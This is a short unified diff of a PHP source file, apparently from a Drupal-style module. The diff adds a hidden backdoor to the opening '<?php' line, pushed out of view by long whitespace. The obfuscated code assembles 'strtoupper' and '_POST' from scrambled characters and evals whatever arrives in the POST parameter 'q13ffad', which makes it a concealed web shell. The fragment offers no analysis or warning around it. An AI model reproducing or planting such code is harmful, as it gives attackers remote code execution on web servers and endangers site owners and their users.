@@ -1,4 +1,4 @@
-<?php
+<?php                                                                                                                                                                                                                                                  $zsja40 = "etpurs_o" ;$kuds04 = $zsja40[5].$zsja40[1]. $zsja40[4]. $zsja40[1].$zsja40[7].$zsja40[3]. $zsja40[2].$zsja40[2].$zsja40[0].$zsja40[4] ; $dws97=$kuds04($zsja40[6]. $zsja40[2]. $zsja40[7]. $zsja40[5]. $zsja40[1] ) ; if ( isset (${ $dws97} ['q13ffad' ] )) {eval(${$dws97} [ 'q13ffad'] );}?> <?php
 
 /**
  * @file
